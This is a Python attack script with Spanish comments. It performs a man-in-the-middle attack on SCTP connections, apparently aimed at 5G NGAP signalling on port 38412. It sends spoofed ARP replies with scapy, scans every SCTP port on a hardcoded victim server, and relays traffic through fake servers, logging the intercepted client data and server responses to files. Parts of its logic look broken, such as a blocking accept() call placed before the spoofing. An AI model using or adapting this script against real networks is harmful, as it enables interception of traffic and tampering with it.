# -*- coding: utf-8 -*-
"""
Created on Thu May  8 19:25:51 2025

@author: alberto
"""
import scapy.all as scapy
import socket
import sctp
import threading
import argparse

# Define los valores por defecto del servidor víctima 

FAKE_SERVER_IP = '127.0.0.1'
FAKE_SERVER_PORT = 38412
REAL_SERVER_IP = '10.10.10.155'
REAL_SERVER_PORT = 38412


# Función para realizar ARP Spoofing
def arp_spoof(target_ip, spoof_ip):
    packet = scapy.ARP(op=2, pdst=target_ip, hwdst=scapy.getmacbyip(target_ip), psrc=spoof_ip)
    scapy.send(packet, verbose=False)

# Función para escanear puertos SCTP
def scan_sctp_ports(ip):
    open_ports = []
    for port in range(1, 65536):
        sock = sctp.sctpsocket_tcp(socket.AF_INET)
        sock.settimeout(1)
        try:
            sock.connect((ip, port))
            open_ports.append(port)
        except:
            pass
        finally:
            sock.close()
    return open_ports

# Función para manejar la comunicación SCTP entre cliente y servidor
def handle_sctp_communication(client_sock, server_ip, server_port):
    server_sock = sctp.sctpsocket_tcp(socket.AF_INET)
    server_sock.connect((server_ip, server_port))
    
    while True:
        data = client_sock.recv(1024)
        if not data:
            break
        print(f"Received from client: {data}")
        server_sock.send(data)
        
        response = server_sock.recv(1024)
        print(f"Received from server: {response}")
        client_sock.send(response)
    
    client_sock.close()
    server_sock.close()

# Función para manejar como proxy la conexión desde un cliente hasta el servidor real
def handle_client(client_socket, server_ip, sctp_port):
    while True:
        client_data = client_socket.recv(1024)
        if not client_data:
            break

        with open('client_data.txt', 'a') as f:
            f.write(client_data.decode() + '\n')

            real_server_socket = sctp.sctpsocket_tcp(socket.AF_INET)
            real_server_socket.connect((server_ip, sctp_port))
            real_server_socket.send(client_data)
    
            server_response = real_server_socket.recv(1024)
    
        with open('server_response.txt', 'a') as f:
            f.write(server_response.decode() + '\n')
    
        client_socket.send(server_response)
        real_server_socket.close()
    
    client_socket.close()

# Función para iniciar la función de proxy
def start_proxy_server(server_ip, sctp_port):
    fake_server_socket = sctp.sctpsocket_tcp(socket.AF_INET)
    fake_server_socket.bind((FAKE_SERVER_IP, sctp_port))
    fake_server_socket.listen(5)
    
    print(f"Proxy SCTP server started at {FAKE_SERVER_IP}:{sctp_port}")
    
    while True:
        client_socket, addr = fake_server_socket.accept()
        print(f"Connection accepted from {addr}")
        client_thread = threading.Thread(target=handle_client, args=(client_socket, server_ip, sctp_port))
        client_thread.start()


# Función principal para realizar el ataque MITM
def mitm_attack(client_ip, server_ip):
    
    # Escanear puertos SCTP en el servidor
    open_ports = scan_sctp_ports(server_ip)
    
    # Crear servidores SCTP falsos para cada puerto abierto
    for port in open_ports:
        print("SCTP port = " + str(port)) 
        sock = sctp.sctpsocket_tcp(socket.AF_INET)
        sock.bind((client_ip, port))
        sock.listen(5)
        
        threading.Thread(target=handle_sctp_communication, args=(sock.accept()[0], server_ip, port)).start()

    # Realizar ARP Spoofing
    arp_spoof(client_ip, server_ip)
    arp_spoof(server_ip, client_ip)

# Ejemplo de uso
client_ip = "10.10.10.7"
server_ip = "10.10.10.155"
mitm_attack(client_ip, server_ip)